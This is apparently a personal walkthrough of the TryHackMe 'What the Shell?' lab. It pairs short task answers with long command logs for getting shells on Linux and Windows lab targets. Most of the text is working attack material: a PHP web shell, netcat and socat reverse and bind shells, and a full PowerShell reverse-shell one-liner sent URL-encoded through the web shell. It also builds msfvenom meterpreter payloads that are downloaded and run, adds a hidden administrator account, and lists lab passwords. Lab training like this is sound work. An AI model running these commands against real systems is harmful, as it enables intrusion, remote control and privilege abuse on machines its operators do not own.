# THM - What the Shell?

<br>

## Task 3

### Task 3.1

> R

### Task 3.2

> N

### Task 3.3

> T

<br>

## Task 4

### Task 4.1

> -l

### Task 4.2

> nc 10.10.10.11 8080

<br>

## Task 5

https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true

### Task 5.1

> stty cols 238

### Task 5.2

> sudo python3 -m http.server 80

<br>

## Task 6

https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true

### Task 6.1

> TCP-L:8080

<br>

## Task 7

### Task 7.1

> socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0

### Task 7.2

> socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane

<br>

## Task 8

https://www.linuxjournal.com/article/2156

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

### Task 8.1

> mkfifo

<br>

## Task 9

### Task 9.2

> _

### Task 9.3

> msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell.elf LHOST=10.10.10.5 LPORT=443

<br>

## Task 10

### Task 10.1

> exploit -j

### Task 10.2

> sessions 10

<br>

## Task 11

https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

<br>

## Task 12

https://dirtycow.ninja/

<br>

## Task 13

### (See Task 14)

```shell
echo '<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>' > shell.php
```

http://10.10.201.170/

🧰 https://www.kali.org/tools/hurl/

```shell
hURL -U 'nc 10.14.27.197 9876 -e /bin/bash'

nc -lvnp 9876
```

http://10.10.201.170/uploads/shell.php?cmd=nc%2010.14.27.197%209876%20-e%20%2Fbin%2Fbash

```shell
	whoami
	
	^C
```

<br>

```shell
cat /usr/share/webshells/php/php-reverse-shell.php

cp /usr/share/webshells/php/php-reverse-shell.php ./

nano php-reverse-shell.php
```

(edit:)
```php
$ip = '10.14.27.197';	// CHANGE THIS
$port = 8765;			// CHANGE THIS
```

```shell
	^X
	y
	^Enter
	
nc -lvnp 8765
```

http://10.10.201.170/

http://10.10.201.170/uploads/php-reverse-shell.php

```shell
	whoami
		
	^C
```

<br>

#### Reverse Shell:

(Terminal 1:)
```shell
nc -lvnp 7654
```

(Terminal 2/ssh:)
```shell
	nc 10.14.27.197 7654 -e /bin/bash
```

(Terminal 1:)
```shell
	whoami
	
	^C
```

#### Bind Shell:

(Terminal 2/ssh:)
```shell
	nc  -lvnp 6543 -e /bin/bash
```

(Terminal 1:)
```shell
nc 10.10.201.170 6543
	whoami
	
	^C
```

<br>

#### Socat Reverse Shell:

(Terminal 1:)
```shell
socat TCP-L:5432 -
```

(Terminal 2/ssh:)
```shell
	 socat TCP:10.14.27.197:5432 EXEC:"bash -li"
```

(Terminal 1:)
```shell
	whoami
	
	^C
```

#### Socat Bind Shell:

(Terminal 2/ssh:)
```shell
	socat TCP-L:4321 EXEC:"bash -li"
```

(Terminal 1:)
```shell
socat TCP:10.10.201.170:4321 -
	whoami
	
	^C
```

#### Socat Special Techniques:

(Terminal 1:)
```shell
socat TCP-L:3210 FILE:`tty`,raw,echo=0
```

(Terminal 2/ssh:)
```shell
	socat TCP:10.14.27.197:3210 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

(Terminal 1:)
```shell
	whoami
	
	exit
```

<br>

### (See Task 15)

http://10.10.105.47/

🧰 https://www.kali.org/tools/hurl/

```shell
nano hURL.txt
```

(edit:)
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.14.27.197',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```shell
	^X
	y
	^Enter

hURL -U -f hURL.txt

nc -lvnp 1234
```

http://10.10.105.47/uploads/shell.php?cmd=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.14.27.197%27%2C1234%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

```shell
	whoami
	
	^C
```

<br>

```shell
hURL -U 'net user dftf dftf /add'
```

http://10.10.105.47/uploads/shell.php?cmd=net%20user%20dftf%20dftf%20%2Fadd

```shell
hURL -U 'net localgroup administrators dftf /add'
```

http://10.10.105.47/uploads/shell.php?cmd=net%20localgroup%20administrators%20dftf%20%2Fadd

```shell
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.105.47 /u:dftf /p:dftf

	^C
```

<br>

#### Reverse Shell:

(Terminal 1:)
```shell
nc -lvnp 2345
```

(Terminal 2/xfreerdp/PowerShell:)
```shell
nc 10.14.27.197 2345 -e "cmd.exe"
```

(Terminal 1:)
```shell
	whoami
	
	exit
```

#### Bind Shell:

(Terminal 2/xfreerdp/PowerShell:)
```shell
nc -lvnp 3456 -e "cmd.exe"
```

(Terminal 1:)
```shell
nc 10.10.189.62 3456
	whoami
	
	exit
```

#### Socat Reverse Shell:

(Terminal 1:)
```shell
socat TCP-L:4567 -
```

(Terminal 2/xfreerdp/PowerShell:)
```shell
socat TCP:10.14.27.197:4567 EXEC:powershell.exe,pipes
```

(Terminal 1:)
```shell
	whoami
	
	exit
```

#### Socat Bind Shell:

(Terminal 2/xfreerdp/PowerShell:)
```shell
socat TCP-L:5678 EXEC:powershell.exe,pipes
```

(Terminal 1:)
```shell
socat TCP:10.10.189.62:5678 -
	whoami
	
	exit
```

<br>

(Terminal 1:)
```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=10.14.27.197 LPORT=6789

python3 -m http.server 8000
```

(Terminal 2/xfreerdp/PowerShell:)
```powershell
cd .\Desktop\
wget http://10.14.27.197:8000/shell.exe -OutFile shell.exe
```

(Terminal 1:)
```shell
	^C

msfconsole
	search multi/handler
	use exploit/multi/handler
		show options
		set LHOST 10.14.27.197
		set LPORT 6789
		set payload windows/x64/meterpreter/reverse_tcp
		exploit
```

(Terminal 2/xfreerdp/PowerShell:)
```powershell
.\shell.exe
```

(Terminal 1:)
```shell
			getuid
			
			exit
		exit
```

<br>

(Terminal 1:)
```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o staged.exe LHOST=10.14.27.197 LPORT=9988

msfvenom -p windows/x64/meterpreter_reverse_tcp -f exe -o stageless.exe LHOST=10.14.27.197 LPORT=7766

python3 -m http.server 8000
```

(Terminal 2/xfreerdp/PowerShell:)
```powershell
wget http://10.14.27.197:8000/staged.exe -OutFile staged.exe

wget http://10.14.27.197:8000/stageless.exe -OutFile stageless.exe
```

(Terminal 1:)
```shell
	^C

nc -lvnp 9988
```

(Terminal 2/xfreerdp/PowerShell:)
```powershell
.\staged.exe
```

(Terminal 1:)
```shell
	^C
```

(Terminal 2/xfreerdp/PowerShell:)
```powershell
.\stageless.exe
```

(Terminal 1:)
```shell
	^C
```

<br>

## Task 14

http://10.10.201.170/

```shell
ssh shell@10.10.201.170
	yes
	TryH4ckM3!
```

<br>

## Task 15

http://10.10.105.47/

```shell
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.189.62 /u:Administrator /p:'TryH4ckM3!'
```

<br>

